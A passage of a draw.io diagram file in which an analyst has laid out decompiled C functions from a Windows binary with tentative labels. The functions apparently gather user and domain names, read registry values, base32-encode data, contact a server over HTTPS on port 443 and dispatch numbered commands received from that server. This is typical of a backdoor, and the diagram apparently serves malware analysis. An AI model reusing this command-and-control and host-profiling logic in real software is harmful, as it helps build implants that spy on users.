        <mxCell id="IVjEpb5pE-T4-foRiEZy-41" value="char *__stdcall sub_403220(char *Destination, char *a2)&#xa;{&#xa;  HANDLE CurrentThread; // eax&#xa;  char *result; // eax&#xa;  HANDLE CurrentProcess; // eax&#xa;  HANDLE TokenHandle; // [esp+0h] [ebp-614h] BYREF&#xa;  DWORD cchReferencedDomainName; // [esp+4h] [ebp-610h] BYREF&#xa;  DWORD cchName; // [esp+8h] [ebp-60Ch] BYREF&#xa;  DWORD ReturnLength; // [esp+Ch] [ebp-608h] BYREF&#xa;  enum _SID_NAME_USE peUse; // [esp+10h] [ebp-604h] BYREF&#xa;  CHAR ReferencedDomainName[253]; // [esp+14h] [ebp-600h] BYREF&#xa;  __int16 v11; // [esp+111h] [ebp-503h]&#xa;  char v12; // [esp+113h] [ebp-501h]&#xa;  CHAR Name[253]; // [esp+114h] [ebp-500h] BYREF&#xa;  __int16 v14; // [esp+211h] [ebp-403h]&#xa;  char v15; // [esp+213h] [ebp-401h]&#xa;  char TokenInformation[1021]; // [esp+214h] [ebp-400h] BYREF&#xa;  __int16 v17; // [esp+611h] [ebp-3h]&#xa;  char v18; // [esp+613h] [ebp-1h]&#xa;&#xa;  memset(TokenInformation, 0, sizeof(TokenInformation));&#xa;  memset(Name, 0, sizeof(Name));&#xa;  v17 = 0;&#xa;  v18 = 0;&#xa;  memset(ReferencedDomainName, 0, sizeof(ReferencedDomainName));&#xa;  v14 = 0;&#xa;  v15 = 0;&#xa;  v11 = 0;&#xa;  v12 = 0;&#xa;  cchName = 256;&#xa;  cchReferencedDomainName = 256;&#xa;  CurrentThread = GetCurrentThread();&#xa;  if ( OpenThreadToken(CurrentThread, 8u, 1, &amp;TokenHandle)&#xa;    || (result = (char *)GetLastError(), result == (char *)1008)&#xa;    &amp;&amp; (CurrentProcess = GetCurrentProcess(), (result = (char *)OpenProcessToken(CurrentProcess, 8u, &amp;TokenHandle)) != 0) )&#xa;  {&#xa;    result = (char *)GetTokenInformation(TokenHandle, TokenUser, TokenInformation, 0x400u, &amp;ReturnLength);&#xa;    if ( result )&#xa;    {&#xa;      result = (char *)LookupAccountSidA(&#xa;                         0,&#xa;                         *(PSID *)TokenInformation,&#xa;                         Name,&#xa;                         &amp;cchName,&#xa;                         ReferencedDomainName,&#xa;                         &amp;cchReferencedDomainName,&#xa;                         &amp;peUse);&#xa;      if ( result )&#xa;      {&#xa;        strncpy(Destination, ReferencedDomainName, 0x3Fu);&#xa;        return strncpy(a2, Name, 0x3Fu);&#xa;      }&#xa;    }&#xa;  }&#xa;  return result;&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="-2070" y="1590" width="560" height="860" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-43" value="&lt;h1&gt;(function 6, called by function 5, something to do with process informationg gathering):&lt;br&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-2100" y="1510" width="680" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-45" value="void __stdcall sub_403360(char *a1)&#xa;{&#xa;  void *v1; // ebx&#xa;  const char *v2; // edi&#xa;  HKEY phkResult; // [esp+Ch] [ebp-10h] BYREF&#xa;  DWORD cbData; // [esp+10h] [ebp-Ch] BYREF&#xa;  DWORD v5; // [esp+14h] [ebp-8h] BYREF&#xa;  BYTE Data[4]; // [esp+18h] [ebp-4h] BYREF&#xa;&#xa;  phkResult = HKEY_CURRENT_USER;&#xa;  if ( RegOpenKeyExA(HKEY_CURRENT_USER, SubKey, 0, 1u, &amp;phkResult) )&#xa;  {&#xa;    RegCloseKey(phkResult);&#xa;    return;&#xa;  }&#xa;  cbData = 0;&#xa;  if ( !RegQueryValueExA(phkResult, ValueName, 0, 0, 0, &amp;cbData) )&#xa;  {&#xa;    v1 = operator new(cbData);&#xa;    memset(v1, 0, cbData);&#xa;    if ( !RegQueryValueExA(phkResult, ValueName, 0, 0, (LPBYTE)v1, &amp;cbData)&#xa;      &amp;&amp; !RegQueryValueExA(phkResult, aAH, 0, 0, 0, &amp;cbData) )&#xa;    {&#xa;      v5 = 4;&#xa;      if ( !RegQueryValueExA(phkResult, aAH, 0, 0, Data, &amp;v5) )&#xa;      {&#xa;        strcat(a1, (const char *)v1);&#xa;        if ( *(_DWORD *)Data )&#xa;        {&#xa;          if ( *(_DWORD *)Data != 1 )&#xa;          {&#xa;LABEL_12:&#xa;            operator delete(v1);&#xa;            return;&#xa;          }&#xa;          v2 = aOn;&#xa;        }&#xa;        else&#xa;        {&#xa;          v2 = aOff;&#xa;        }&#xa;        strcat(a1, v2);&#xa;        goto LABEL_12;&#xa;      }&#xa;    }&#xa;  }&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="-1999.5" y="2700" width="450" height="700" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-47" value="&lt;h1&gt;(function 7, called by function 5, something to do with registry):&lt;br&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-2060" y="2590" width="680" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-49" value="int __stdcall SprintFFunction(char *Buffer)&#xa;{&#xa;  return sprintf(Buffer, &quot;%s%u&quot;, asc_4073E8, dword_407624);&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="-80" y="1250" width="370" height="80" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-51" value="&lt;h1&gt;&lt;font color=&quot;#b6ff24&quot;&gt;(function 8,&amp;nbsp;SprintFFunction):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-90" y="1180" width="360" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-53" value="int __cdecl ProcessDataBuffers(_BYTE *InputBuffer, _BYTE *InputBuffer2, unsigned int BufferSize)&#xa;{&#xa;  _BYTE *v3; // ecx&#xa;  _BYTE *v4; // esi&#xa;  unsigned int v5; // ebp&#xa;  char v6; // al&#xa;  char v7; // dl&#xa;  char v8; // bl&#xa;  unsigned __int8 v9; // al&#xa;  _BYTE *v10; // ecx&#xa;  int result; // eax&#xa;  unsigned __int8 v12; // [esp+4h] [ebp-1Ch]&#xa;  unsigned __int8 v13; // [esp+8h] [ebp-18h]&#xa;  unsigned __int8 v14; // [esp+Ch] [ebp-14h]&#xa;  unsigned __int8 v15; // [esp+10h] [ebp-10h]&#xa;  int v16; // [esp+14h] [ebp-Ch]&#xa;  unsigned __int8 v17; // [esp+18h] [ebp-8h]&#xa;  unsigned __int8 v18; // [esp+1Ch] [ebp-4h]&#xa;  unsigned __int8 InputBuffera; // [esp+24h] [ebp+4h]&#xa;  unsigned int InputBuffer2a; // [esp+28h] [ebp+8h]&#xa;  unsigned __int8 BufferSizea; // [esp+2Ch] [ebp+Ch]&#xa;&#xa;  v3 = InputBuffer;&#xa;  if ( !InputBuffer )&#xa;    return 0;&#xa;  v4 = InputBuffer2;&#xa;  if ( !InputBuffer2 )&#xa;    return 0;&#xa;  v5 = BufferSize;&#xa;  InputBuffer2a = BufferSize;&#xa;  v16 = 0;&#xa;  if ( BufferSize )&#xa;  {&#xa;    while ( 1 )&#xa;    {&#xa;      if ( v5 &gt;= 5 )&#xa;        v5 = 5;&#xa;      v6 = 0;&#xa;      v7 = 0;&#xa;      v8 = 0;&#xa;      v15 = 0;&#xa;      InputBuffera = 0;&#xa;      v14 = 0;&#xa;      v13 = 0;&#xa;      v12 = 0;&#xa;      BufferSizea = 0;&#xa;      v18 = 0;&#xa;      v17 = 0;&#xa;      switch ( v5 )&#xa;      {&#xa;        case 1u:&#xa;          goto LABEL_13;&#xa;        case 2u:&#xa;          goto LABEL_12;&#xa;        case 3u:&#xa;          goto LABEL_11;&#xa;        case 4u:&#xa;          goto LABEL_10;&#xa;        case 5u:&#xa;          v15 = v4[4] &amp; 0x1F;&#xa;          InputBuffera = v4[4] &gt;&gt; 5;&#xa;LABEL_10:&#xa;          InputBuffera |= 8 * (v4[3] &amp; 3);&#xa;          v14 = (v4[3] &gt;&gt; 2) &amp; 0x1F;&#xa;          v6 = v4[3] &gt;&gt; 7;&#xa;LABEL_11:&#xa;          v13 = (2 * (v4[2] &amp; 0xF)) | v6;&#xa;          v7 = v4[2] &gt;&gt; 4;&#xa;LABEL_12:&#xa;          v9 = v4[1];&#xa;          v12 = (16 * (v9 &amp; 1)) | v7;&#xa;          BufferSizea = (v9 &gt;&gt; 1) &amp; 0x1F;&#xa;          v8 = v9 &gt;&gt; 6;&#xa;LABEL_13:&#xa;          v18 = (4 * (*v4 &amp; 7)) | v8;&#xa;          v17 = *v4 &gt;&gt; 3;&#xa;          break;&#xa;        default:&#xa;          break;&#xa;      }&#xa;      v4 += v5;&#xa;      InputBuffer2a -= v5;&#xa;      switch ( v5 )&#xa;      {&#xa;        case 1u:&#xa;          v12 = 32;&#xa;          BufferSizea = 32;&#xa;          goto LABEL_16;&#xa;        case 2u:&#xa;LABEL_16:&#xa;          v13 = 32;&#xa;          goto LABEL_17;&#xa;        case 3u:&#xa;LABEL_17:&#xa;          InputBuffera = 32;&#xa;          v14 = 32;&#xa;          goto LABEL_18;&#xa;        case 4u:&#xa;LABEL_18:&#xa;          v15 = 32;&#xa;          break;&#xa;        default:&#xa;          break;&#xa;      }&#xa;      v10 = v3 + 1;&#xa;      *(v10++ - 1) = aAbcdefghijklmn[v17];&#xa;      *(v10++ - 1) = aAbcdefghijklmn[v18];&#xa;      *(v10++ - 1) = aAbcdefghijklmn[BufferSizea];&#xa;      *(v10++ - 1) = aAbcdefghijklmn[v12];&#xa;      *(v10++ - 1) = aAbcdefghijklmn[v13];&#xa;      *(v10++ - 1) = aAbcdefghijklmn[v14];&#xa;      *(v10 - 1) = aAbcdefghijklmn[InputBuffera];&#xa;      v3 = v10 + 1;&#xa;      *(v3 - 1) = aAbcdefghijklmn[v15];&#xa;      v16 += 8;&#xa;      if ( !InputBuffer2a )&#xa;        break;&#xa;      v5 = InputBuffer2a;&#xa;    }&#xa;  }&#xa;  result = v16;&#xa;  *v3 = 0;&#xa;  return result;&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="-469" y="1540" width="560" height="1820" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-56" value="&lt;h1&gt;&lt;font color=&quot;#ff8b26&quot;&gt;(function 9,&amp;nbsp;ProcessDataBuffers):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-469" y="1480" width="410" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-59" value="int __stdcall AppendToBuffer(char *Buffer, int a2, const char *a3)&#xa;{&#xa;  int result; // eax&#xa;&#xa;  sprintf(Buffer, aYf, a2);&#xa;  result = 0;&#xa;  strcat(Buffer, aRf8t69mIWm);&#xa;  strcat(Buffer, aPj);&#xa;  strcat(Buffer, aDz);&#xa;  strcat(Buffer, aPj_0);&#xa;  strcat(Buffer, aPj_1);&#xa;  strcat(Buffer, aRfX0wEtbUqP3);&#xa;  strcat(Buffer, a3);&#xa;  strcat(Buffer, asc_407478);&#xa;  return result;&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="-459" y="3650" width="380" height="250" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-62" value="&lt;h1&gt;&lt;font color=&quot;#ffcce6&quot;&gt;(function 10, sprintf + some appends to buffer):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-489" y="3560" width="550" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-65" value="int __thiscall sub_4034D0(int this, int a2, int a3, int a4, int a5, int a6, _DWORD *a7)&#xa;{&#xa;  int v8; // ebx&#xa;  int v10; // eax&#xa;  int v11; // ebp&#xa;  int v12; // eax&#xa;  int v13; // edi&#xa;  int v14; // ebx&#xa;  int v15; // ebp&#xa;  int i; // [esp+ACh] [ebp-Ch] BYREF&#xa;  int v17; // [esp+B0h] [ebp-8h] BYREF&#xa;  int v18; // [esp+B4h] [ebp-4h]&#xa;&#xa;  v8 = (*(int (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(this + 4))(0, 0, 0, 0, 0);&#xa;  v18 = v8;&#xa;  if ( v8 )&#xa;  {&#xa;    v17 = 20000;&#xa;    if ( (*(int (__stdcall **)(int, int, int *, int))(this + 8))(v8, 2, &amp;v17, 4) )&#xa;    {&#xa;      v10 = (*(int (__stdcall **)(int, int, int, _DWORD, _DWORD, int, _DWORD, _DWORD))(this + 12))(&#xa;              v8,&#xa;              a3,&#xa;              443,&#xa;              0,&#xa;              0,&#xa;              3,&#xa;              0,&#xa;              0);&#xa;      v11 = v10;&#xa;      v17 = v10;&#xa;      if ( v10 )&#xa;      {&#xa;        v12 = (*(int (__stdcall **)(int, void *, int, void *, _DWORD, _DWORD, int, _DWORD))(this + 16))(&#xa;                v10,&#xa;                &amp;unk_4071D4,&#xa;                a4,&#xa;                &amp;unk_4071E0,&#xa;                0,&#xa;                0,&#xa;                13119488,&#xa;                0);&#xa;        v13 = v12;&#xa;        if ( v12 )&#xa;        {&#xa;          if ( (*(int (__stdcall **)(int, int, int, _DWORD, _DWORD))(this + 20))(v12, a2, -1, 0, 0)&#xa;            || GetLastError() == 12045&#xa;            &amp;&amp; (a4 = 4,&#xa;                (*(void (__stdcall **)(int, int, int *, int *))(this + 24))(v13, 31, &amp;a3, &amp;a4),&#xa;                a3 |= 0x180u,&#xa;                (*(void (__stdcall **)(int, int, int *, int))(this + 8))(v13, 31, &amp;a3, 4),&#xa;                (*(int (__stdcall **)(int, int, int, _DWORD, _DWORD))(this + 20))(v13, a2, -1, 0, 0)) )&#xa;          {&#xa;            v14 = a5;&#xa;            v15 = a6;&#xa;            for ( i = 0; ; *a7 += i )&#xa;            {&#xa;              Sleep(0x64u);&#xa;              v14 += i;&#xa;              if ( !(*(int (__stdcall **)(int, int, int, int *))(this + 32))(v13, v14, v15, &amp;i) )&#xa;              {&#xa;                GetLastError();&#xa;                (*(void (__stdcall **)(int))(this + 28))(v18);&#xa;                (*(void (__stdcall **)(int))(this + 28))(v17);&#xa;                (*(void (__stdcall **)(int))(this + 28))(v13);&#xa;                return 0;&#xa;              }&#xa;              if ( !i )&#xa;                break;&#xa;              v15 -= i;&#xa;            }&#xa;            (*(void (__stdcall **)(int))(this + 28))(v13);&#xa;            (*(void (__stdcall **)(int))(this + 28))(v17);&#xa;            (*(void (__stdcall **)(int))(this + 28))(v18);&#xa;            return 1;&#xa;          }&#xa;          else&#xa;          {&#xa;            (*(void (__stdcall **)(int))(this + 28))(v8);&#xa;            (*(void (__stdcall **)(int))(this + 28))(v17);&#xa;            (*(void (__stdcall **)(int))(this + 28))(v13);&#xa;            return 0;&#xa;          }&#xa;        }&#xa;        else&#xa;        {&#xa;          GetLastError();&#xa;          (*(void (__stdcall **)(int))(this + 28))(v8);&#xa;          (*(void (__stdcall **)(int))(this + 28))(v11);&#xa;          (*(void (__stdcall **)(_DWORD))(this + 28))(0);&#xa;          return 0;&#xa;        }&#xa;      }&#xa;      else&#xa;      {&#xa;        GetLastError();&#xa;        (*(void (__stdcall **)(int))(this + 28))(v8);&#xa;        (*(void (__stdcall **)(_DWORD))(this + 28))(0);&#xa;        return 0;&#xa;      }&#xa;    }&#xa;    else&#xa;    {&#xa;      GetLastError();&#xa;      (*(void (__stdcall **)(int))(this + 28))(v8);&#xa;      return 0;&#xa;    }&#xa;  }&#xa;  else&#xa;  {&#xa;    GetLastError();&#xa;    (*(void (__stdcall **)(_DWORD))(this + 28))(0);&#xa;    return 0;&#xa;  }&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="750" y="1690" width="560" height="1720" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-67" value="&lt;h1&gt;&lt;font color=&quot;#47e7ff&quot;&gt;(function 11, no idea what it is):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="750" y="1630" width="410" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-70" value="int sub_401C50()&#xa;{&#xa;  int result; // eax&#xa;  int v1[131]; // [esp-210h] [ebp-D30h] BYREF&#xa;  int *v2; // [esp-4h] [ebp-B24h]&#xa;  int v3; // [esp+10h] [ebp-B10h] BYREF&#xa;  char v4[128]; // [esp+14h] [ebp-B0Ch] BYREF&#xa;  char Buffer[128]; // [esp+94h] [ebp-A8Ch] BYREF&#xa;  int Parameter[131]; // [esp+114h] [ebp-A0Ch] BYREF&#xa;  char v7[1024]; // [esp+320h] [ebp-800h] BYREF&#xa;  char v8[1024]; // [esp+720h] [ebp-400h] BYREF&#xa;&#xa;  memset(v4, 0, sizeof(v4));&#xa;  memset(Buffer, 0, sizeof(Buffer));&#xa;  v3 = 0;&#xa;  memset(v8, 0, sizeof(v8));&#xa;  memset(v7, 0, sizeof(v7));&#xa;  sub_402980(Buffer);&#xa;  sub_402BC0(v8, (int)byte_4075E0, (int)v4);&#xa;  strcpy(v4, byte_4075E0);&#xa;  strcat(v4, Buffer);&#xa;  if ( !sub_4034D0(v8, byte_4075E0, Buffer, v7, 1024, &amp;v3) || !strcmp(v7, aStatusSuccess) )&#xa;    return 0;&#xa;  if ( !v3 )&#xa;    return 1;&#xa;  qmemcpy(Parameter, v7, sizeof(Parameter));&#xa;  sub_4028A0(&amp;Parameter[3], 512);&#xa;  switch ( Parameter[0] )&#xa;  {&#xa;    case 4:&#xa;      v2 = (int *)v4;&#xa;      qmemcpy(v1, Parameter, sizeof(v1));&#xa;      sub_401F20();&#xa;      return 1;&#xa;    case 5:&#xa;      v2 = (int *)v4;&#xa;      qmemcpy(v1, Parameter, sizeof(v1));&#xa;      sub_4020E0();&#xa;      return 1;&#xa;    case 6:&#xa;      v2 = (int *)v4;&#xa;      qmemcpy(v1, Parameter, sizeof(v1));&#xa;      sub_402150();&#xa;      return 1;&#xa;    case 7:&#xa;      CreateThread(0, 0, StartAddress, Parameter, 0, 0);&#xa;      Sleep(0x1F4u);&#xa;      result = 1;&#xa;      break;&#xa;    case 8:&#xa;      v2 = (int *)v4;&#xa;      qmemcpy(v1, Parameter, sizeof(v1));&#xa;      sub_4023A0(v1[0], v1[1], v1[2], v1[3]);&#xa;      return 1;&#xa;    default:&#xa;      return 1;&#xa;  }&#xa;  return result;&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="755" y="3640" width="520" height="870" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-74" value="&lt;h1&gt;&lt;font color=&quot;#b6ff24&quot;&gt;(function 12)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="740" y="3580" width="550" height="70" as="geometry" />
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
